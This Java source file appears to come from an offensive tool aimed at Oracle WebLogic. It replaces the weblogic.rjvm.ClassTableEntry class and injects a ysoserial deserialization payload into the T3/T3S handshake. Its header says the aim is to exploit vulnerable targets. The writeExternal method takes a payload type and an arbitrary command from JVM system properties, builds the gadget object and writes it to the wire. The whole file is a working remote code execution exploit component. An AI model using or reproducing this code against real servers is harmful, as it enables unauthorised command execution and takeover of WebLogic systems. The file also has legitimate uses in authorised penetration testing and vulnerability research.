/*
	ClassTableEntry.java
	
	v0.4 (10/23/2018)
	
	Custom implementation of the weblogic.rjvm.ClassTableEntry class (because we cannot modify the Oracle-provided class or know exactly what the class does
	within the Oracle licensing terms). Reads payload options from JVM System properties, then generates payload and writes it directly to T3/T3S communication
	initialization. At this time, this mostly breaks the intended functionality of the T3/T3S communication, but this still allows vulnerable target systems
	to be successfully exploited. Additionally, more ysoserial payload types are supported using this method.
*/

package weblogic.rjvm;

import java.io.Externalizable;
import java.io.ObjectStreamClass;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.io.InputStream;
import java.io.IOException;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;

final class ClassTableEntry implements Externalizable {
	ObjectStreamClass descriptor;
	String annotation;
	Class clz;
	ClassLoader ccl;
	boolean sent;

	public ClassTableEntry() {
		annotation = "";
		descriptor = ObjectStreamClass.lookup(annotation.getClass());
		clz = null;
		ccl = null;
		sent = Boolean.parseBoolean(System.getProperty("bort.millipede.wlt3.sent"));
	}

	public ClassTableEntry(ObjectStreamClass osc, String s) {
		descriptor = osc;
		annotation = s;
		clz = null;
		ccl = null;
		sent = Boolean.parseBoolean(System.getProperty("bort.millipede.wlt3.sent"));
	}
	
	@Override
	public void readExternal(ObjectInput oi) throws IOException, ClassNotFoundException {
		
	}
	
	@Override
	public void writeExternal(ObjectOutput oo) throws IOException {
		try {
			String payloadType = System.getProperty("bort.millipede.wlt3.type");
			String command = System.getProperty("bort.millipede.wlt3.command");
			if((payloadType != null) && (command != null) && !sent) { //if payload options are in JVM System properties and the payload does not appear to have been sent: write payload to T3
				final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
				final ObjectPayload payload = payloadClass.newInstance();
				oo.writeObject(payload.getObject(command));
				sent = true;
				System.setProperty("bort.millipede.wlt3.sent",Boolean.toString(true));
			} else {
				oo.writeObject(descriptor);
			}
			oo.writeBytes(annotation);
		} catch(Exception e) {
			System.err.println("Exception occurred in custom ClassTableEntry class writeExternal() method!!!");
			e.printStackTrace();
		}
	}
	
	//method telling caller if weblogic.rjvm.ClassTableEntry class loaded into JVM is a custom implementation.
	public static boolean isCTECustom() {
		return true;
	}
}

